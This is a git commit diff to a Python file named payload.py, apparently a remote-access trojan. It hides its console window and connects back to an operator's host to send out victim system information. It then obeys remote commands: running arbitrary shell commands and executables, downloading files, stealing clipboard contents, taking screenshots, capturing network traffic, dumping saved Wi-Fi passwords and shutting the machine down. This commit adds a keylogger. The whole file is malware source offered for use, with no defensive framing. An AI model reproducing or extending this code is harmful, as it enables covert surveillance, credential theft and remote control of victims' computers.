ed1b438947e838af8efc5d885565c44d50b707c2
Dev. Gautam Kumar <111997815+devsdenepal@users.noreply.github.com>
2023-05-02 18:30:45 +0545

    Update payload.py

--- resources/payload.py
+++ resources/payload.py
@@ -16,7 +16,8 @@ import webbrowser
 import pyperclip
 import http.server
 import socketserver
-debug = True
+from pynput.keyboard import Key, Listener
+import logging
 # hiding the payload
 def hide_window():
     win = win32console.GetConsoleWindow()
@@ -24,7 +25,8 @@ def hide_window():
 # fetch victim information
 def collect_os_info():
     get_os =  platform.uname()
-    get_user = getuser()
+    get_user = "[R01]"+getuser()
+#    talk_back(get_user)
     os_info = '[OS INFO] client_name: '+str(get_user)+' <-> '+'client_os: '+str(get_os)
     return os_info
 def generate_file_name():
@@ -39,7 +41,7 @@ def get_clipboard():
     statement= str(pyperclip.paste())
     return statement
 def take_screenshot():
-    statement = 'Taking screenshot...'
+    # statement = 'Taking screenshot...'
     pyautogui.screenshot().save(generate_file_name() + '.png')
     statement = statement+'\nScreenshot saved!'
     return statement
@@ -52,7 +54,7 @@ def serve_http():
         httpd.serve_forever()
     return statement
 def analyze_lan_traffic(delay,filename):
-    statement = 'Starting Trace Capture...'
+   # statement = 'Starting Trace Capture...'
     subprocess.run(['netsh', 'trace', 'start', 'capture=yes', 'tracefile='+filename], capture_output=True)
     time.sleep(delay)
     statement = 'Stopping Trace...'
@@ -82,15 +84,28 @@ def generate_wlan_ind_profile(profile_name):
     result = subprocess.run([f"netsh wlan show profile name={profile_name} key=clear"], stdout=subprocess.PIPE)
     statement = result.stdout.decode('utf-8') 
     return statement
-if debug == False:
-    hide_window()
+
+def talk_back(message):
+    print("Sending [ "+message+" ]...")
+    connection.send(message.encode())
+def record_key_strokes():
+    log_dir = ""
+    logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
+	level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    def on_press(key):
+        logging.info(str(key))
+    return "key logging started !"
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+    
+hide_window()
 # Lhost and lport
-HOST = '127.0.0.1'
+HOST = 
 PORT = 444
 # connection configuration
 connection = socket(AF_INET, SOCK_STREAM)
 connection.connect((HOST, PORT))
-connection.send(collect_os_info().encode())
+talk_back(collect_os_info())
 print('connection established !')
 # payload execution
 while True:
@@ -99,56 +114,66 @@ while True:
         exit()
     elif receiver[:2] == 'cd':
         os.chdir(receiver[3:])
-        connection.send(os.getcwd().encode())
+        talk_back(os.getcwd())
     elif ".exe" in receiver:
-        warning = "(!) Executing "+receiver
-        connection.send(warning.encode())
+        # warning = "(!) Executing "+receiver
+        # talk_back(warning)
         result = subprocess.run(receiver, shell=True, capture_output=True)
         # Print the output of the command
-        # connection.send(result)
+        # talk_back(result)
         statement = "done !"
-        connection.send(statement.encode())
+        talk_back(statement)
     elif "type" in receiver:
         text = receiver[4:]
         time.sleep(2)
         statement = press_keys(text)
-        connection.send(statement.encode())
+        talk_back(statement)
     elif "download" in receiver:
         URL = receiver[8:]
         statement = download_file(URL)
-        connection.send(statement.encode())
+        talk_back(statement)
     elif "set clipboard" in receiver:
-        text = receiver[13:]
+        text = receiver[14:]
         statement = str(set_clipboard(text))
-        connection.send(statement.encode())
+        talk_back(statement)
     elif "get clipboard" in receiver:
         statement = get_clipboard()
-        connection.send(statement.encode())
+        talk_back(statement)
     elif "analyze lan traffic" in receiver:
         statement = analyze_lan_traffic()
-        connection.send(statement.encode())
+        talk_back(statement)
     elif "take screenshot" in receiver:
         statement = take_screenshot()
-        connection.send(statement.encode())
+        talk_back(statement)
     elif "start file server" in receiver:
         statement = serve_http()
-        connection.send(statement.encode())
+        talk_back(statement)
     elif "generate wlan profile *" in receiver:
         statement = generate_wlan_profile()
-        connection.send(statement.encode())
+        talk_back(statement)
     elif receiver == "generate wlan profile":
         statement = generate_wlan_ind_profile(receiver[22:])
-        connection.send(statement.encode())
+        talk_back(statement)
     elif 'browse' in receiver[:6]:
-        statement = open_link(receiver[6:])
-        connection.send(statement.encode())
+        statement = open_link(receiver[7:])
+        talk_back(statement)
+    elif 'shutdown' in receiver[:8]:
+        if 'shutdown -t' in receiver[:11]:
+            subprocess.getoutput('shutdown -s -t '+receiver[12:])
+            statement = 'Shutting down in'+ str(int(receiver[12:])/60)+'minute(s)'
+        else:
+            subprocess.getoutput('shutdown -s -t 30')
+            statement = 'Shutting down in 30 seconds'
+        talk_back(statement)
+    elif receiver == 'start keylogger':
+        statement = record_key_strokes()
+        talk_back(statement) 
     else:
         out_put = subprocess.getoutput(receiver)
-        statement = "Executing command:" + receiver+'\n'
+        statement = "Executing command:" + receiver+'\n'+out_put
         if out_put =='' or out_put == None:
-            output='---'
-            connection.send(statement.encode())
-            connection.send(out_put.encode())
+            output='NO OUTPUT'
+            talk_back(statement)
+            talk_back(out_put)
         else:
-            connection.send(statement.encode())
-            connection.send(out_put.encode())
+            talk_back(statement)
